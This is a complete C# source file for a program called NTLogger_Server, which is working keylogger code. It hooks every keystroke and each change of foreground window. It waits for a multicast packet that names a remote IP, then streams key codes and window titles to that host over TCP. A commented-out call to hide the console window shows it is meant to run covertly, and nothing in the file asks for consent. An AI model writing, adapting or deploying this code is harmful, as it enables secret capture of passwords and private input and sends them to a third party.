using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace NTLogger_Server
{
    class NTLogServer
    {
        private const int WH_KEYBOARD_LL = 13;

        private static readonly LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static WinEventDelegate wed;
        private const uint WINEVENT_OUTOFCONTEXT = 0;
        private const uint EVENT_SYSTEM_FOREGROUND = 3;

        private static TcpClient handle;

        static void Main(string[] args)
        {
            var windowHndl = GetConsoleWindow();

            // Hide
            //ShowWindow(windowHndl, SW_HIDE);

            _hookID = SetHook(_proc);
            wed = new WinEventDelegate(WinEventProc);
            IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, wed, 0, 0, WINEVENT_OUTOFCONTEXT);

            new Thread(new ThreadStart(delegate
            {
                // Setup UDP listeners
                Socket udpListenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 10036);
                udpListenerSocket.Bind(ipep);
                IPAddress broadcastIP = IPAddress.Parse("224.5.6.7");
                udpListenerSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.AddMembership, 
                    new MulticastOption(broadcastIP, IPAddress.Any));

                Console.WriteLine("Waiting for connection...");
                // Listen for incoming client IP address
                while (udpListenerSocket.IsBound)
                {
                    try
                    {
                        byte[] bytes = new byte[128];
                        int len = udpListenerSocket.Receive(bytes);
                        string target = Encoding.ASCII.GetString(bytes, 0, len).Trim();
                        Console.WriteLine($"Accepted broadcast to ip {target}, connection will begin shortly");

                        // Start listen process
                        Console.WriteLine("Listen thread acknowledges presence of remote target!");
                        try
                        {
                            // Initialize connection to remote client
                            handle = new TcpClient();
                            handle.Connect(target, 10035);
                            Console.WriteLine($"Accepted connection to {target}");

                            while (handle.Connected)
                            {
                                // Block up the thread until something happens (until connection lost or error thrown)
                                Thread.Sleep(2000);
                            }

                            Console.WriteLine("Lost connection");
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"Error in LISTEN_THREAD: {e.Message}");
                        }
                        // Nullify everything so that nothing complains, even if error occurs in case faulty broadcast packet received
                        handle = null;
                        Console.WriteLine("Cleanup complete, return to listening");
                    }
                    catch(Exception e)
                    {
                        Console.WriteLine($"Error in BROADCAST_THREAD: {e.Message}");
                    }
                }
                
            })).Start();

            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && handle != null)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    handle.Client.Send(Encoding.ASCII.GetBytes("K" + "\n"));
                    handle.Client.Send(Encoding.ASCII.GetBytes(wParam.ToInt32() + "\n"));
                    handle.Client.Send(Encoding.ASCII.GetBytes(vkCode + "\n"));
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error in HookCallback: {e.Message}");
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            try
            {
                if (handle != null)
                {
                    handle.Client.Send(Encoding.ASCII.GetBytes("W" + "\n"));
                    handle.Client.Send(Encoding.ASCII.GetBytes(GetActiveWindowTitle() + "\n"));
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error in WinEventProc: {e.Message}");
            }
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr hndl = GetForegroundWindow();
            if (GetWindowText(hndl, Buff, nChars) > 0)
                return Buff.ToString();
            return null;
        }

        private delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

        // DLLImports below handle getting window names
        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        // DLLImports below handle windows event hooking, into both keyboard and foreground window
        [DllImport("user32.dll")]
        static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
